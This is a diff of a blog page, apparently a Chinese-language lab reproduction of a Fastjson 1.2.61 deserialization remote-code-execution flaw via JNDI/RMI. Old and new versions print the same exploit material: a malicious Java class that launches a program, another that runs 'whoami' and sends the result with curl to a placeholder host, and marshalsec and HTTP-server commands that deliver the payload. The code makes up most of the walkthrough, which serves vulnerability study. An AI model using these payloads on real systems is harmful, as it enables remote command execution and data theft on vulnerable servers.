@@ -113,70 +113,18 @@
         <div class="section">
           <div class="post_content">
               <p>必备的jar包和Java 1.8.U20：</p>
-<pre><code>fastjson-1.2.61.jar
-commons-configuration2-2.0.jar
-commons-lang3-3.3.2.jar
-commons-logging-1.2.jar
-</code></pre><p>此处使用IDEA来做复现，首先导入这四个JAR包。创建使用POC的FastJsonTest。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastjson-1.2.61.jar</span><br><span class="line">commons-configuration2-2.0.jar</span><br><span class="line">commons-lang3-3.3.2.jar</span><br><span class="line">commons-logging-1.2.jar</span><br></pre></td></tr></table></figure>
+<p>此处使用IDEA来做复现，首先导入这四个JAR包。创建使用POC的FastJsonTest。</p>
 <p><img src="https://i.loli.net/2019/10/14/4br1TCwMXgzRdeO.png" alt="1571032870844.png"></p>
 <p>此处使用RMI来做测试。同时创建一个恶意类，使用已经提供的恶意Java文件。</p>
-<pre><code>import java.io.BufferedReader;
-import java.io.InputStreamReader;
-
-public class ExportObject {
-    public ExportObject() throws Exception {
-        Process proc = Runtime.getRuntime().exec(&quot;calc&quot;);
-        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-        StringBuffer sb = new StringBuffer();
-
-        String line;
-        while((line = br.readLine()) != null) {
-            sb.append(line).append(&quot;\n&quot;);
-        }
-
-        String result = sb.toString();
-        Exception e = new Exception(result);
-        throw e;
-    }
-
-    public static void main(String[] args) throws Exception {
-    }
-}
-
-</code></pre><p>当然也可以使用之前版本RCE的恶意Java文件。需要做监听，达到回显的目的。</p>
-<pre><code>import java.io.BufferedInputStream;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-public class Exploit {
-    public static String exec(String cmd) throws Exception {
-        String sb = &quot;&quot;;
-        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
-        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
-        String lineStr;
-        while ((lineStr = inBr.readLine()) != null)
-            sb += lineStr + &quot;\n&quot;;
-        inBr.close();
-        in.close();
-        return sb;
-    }
-    public Exploit() throws Exception {
-        String result = &quot;&quot;;
-        result = exec(&quot;whoami&quot;);
-        String cmd=&quot;curl http://x.x.x.x/&quot;+result;
-        throw new Exception(exec(cmd));
-    }
-    public static void main(String[] args) throws Exception {
-        String result = &quot;&quot;;
-        result = exec(&quot;whoami&quot;);
-        String cmd=&quot;curl http://x.x.x.x/&quot;+result;
-        throw new Exception(exec(cmd));
-    }
-}
-</code></pre><p>启动一个RMI监听服务</p>
-<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#ExportObject
-</code></pre><p>开启一个http服务</p>
-<pre><code>python -m SimpleHTTPServer
-</code></pre><p>运行IDEA中的POC，发现可以弹出计算器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ExportObject &#123;</span><br><span class="line">    public ExportObject() throws Exception &#123;</span><br><span class="line">        Process proc = Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String result = sb.toString();</span><br><span class="line">        Exception e = new Exception(result);</span><br><span class="line">        throw e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当然也可以使用之前版本RCE的恶意Java文件。需要做监听，达到回显的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">public class Exploit &#123;</span><br><span class="line">    public static String exec(String cmd) throws Exception &#123;</span><br><span class="line">        String sb = &quot;&quot;;</span><br><span class="line">        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        while ((lineStr = inBr.readLine()) != null)</span><br><span class="line">            sb += lineStr + &quot;\n&quot;;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        return sb;</span><br><span class="line">    &#125;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line">        result = exec(&quot;whoami&quot;);</span><br><span class="line">        String cmd=&quot;curl http://x.x.x.x/&quot;+result;</span><br><span class="line">        throw new Exception(exec(cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line">        result = exec(&quot;whoami&quot;);</span><br><span class="line">        String cmd=&quot;curl http://x.x.x.x/&quot;+result;</span><br><span class="line">        throw new Exception(exec(cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>启动一个RMI监听服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#ExportObject</span><br></pre></td></tr></table></figure>
+<p>开启一个http服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
+<p>运行IDEA中的POC，发现可以弹出计算器。</p>
 <p><img src="https://i.loli.net/2019/10/14/4ipBcDsJgeIR8Av.png" alt="2"></p>
 <p>HTTP服务上也有请求的记录。</p>
 <p><img src="https://i.loli.net/2019/10/14/jtrKFRiJhPX9dyM.png" alt="1571042112558.png"></p>
